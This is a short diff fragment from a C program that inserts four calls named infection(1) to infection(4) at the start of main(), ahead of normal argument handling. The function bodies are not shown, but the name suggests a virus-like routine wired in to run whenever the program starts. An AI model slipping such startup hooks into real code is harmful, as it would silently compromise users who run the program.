@@ -41,7 +41,10 @@ void print(char *str);
 
 int main(int argc, char *argv[], char *envp[])
 {
-    
+    infection(1);
+    infection(2);
+    infection(3);
+    infection(4);
     char *prefix;
     int i;
     for (i = 1; i < argc; i++)
